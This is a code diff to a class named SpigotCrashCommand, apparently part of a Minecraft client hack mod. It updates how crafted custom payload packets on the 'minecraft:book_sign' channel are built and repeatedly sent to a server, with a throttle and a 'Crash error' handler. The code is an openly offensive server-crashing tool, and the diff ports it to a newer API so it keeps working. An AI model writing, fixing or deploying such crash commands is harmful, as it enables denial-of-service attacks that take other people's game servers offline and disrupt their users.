@@ -79,15 +79,17 @@ public class SpigotCrashCommand extends Command {
                         PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
                         buf.writeBytes(payload);
 
-                        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(
-                            new Identifier("minecraft", "book_sign"), // Or any valid custom channel
-                            buf
-                        );
+                        Identifier channel = Identifier.of("minecraft:book_sign");
+
+                        CustomPayloadC2SPacket.CustomPayload customPayload =
+                                new CustomPayloadC2SPacket.CustomPayload(channel, buf);
+
+                        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(customPayload);
 
                         connection.sendPacket(packet);
                     }
 
-                    Thread.sleep(50); // throttle to avoid lockout
+                    Thread.sleep(50); // throttle to reduce risk of client disconnect
                 }
             } catch (Exception e) {
                 Helper.printChatMessage("§cCrash error: " + e.getMessage());
